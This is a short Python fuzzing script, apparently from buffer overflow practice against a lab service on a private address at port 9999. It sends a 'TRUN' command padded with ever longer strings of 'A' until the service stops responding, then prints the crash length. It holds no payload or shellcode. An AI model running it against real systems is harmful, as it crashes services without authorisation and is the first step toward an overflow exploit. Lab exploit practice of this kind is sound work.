# -*-coding:Latin-1 -*
import socket
import time

# ----- INPUT -----
target = '192.168.56.104'
port = 9999
# -----------------

TIMEOUT = 2
STEP = 200

buffer = 'A' * STEP 
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((target, port))

        print('Fuzzing with %d bytes' % len(buffer))
        # ----- EXPLOIT -----
        s.recv(1024)
        cmd = 'TRUN .' + buffer
        s.send(cmd.encode())
        # -------------------

        s.close()
        time.sleep(1)

        buffer += 'A' * STEP

    except socket.timeout:
        print('Fuzzing crashed at %d bytes' % (len(buffer) - STEP))
        break
    except Exception as e:
        print("Exception: %s" % str(e))
        break
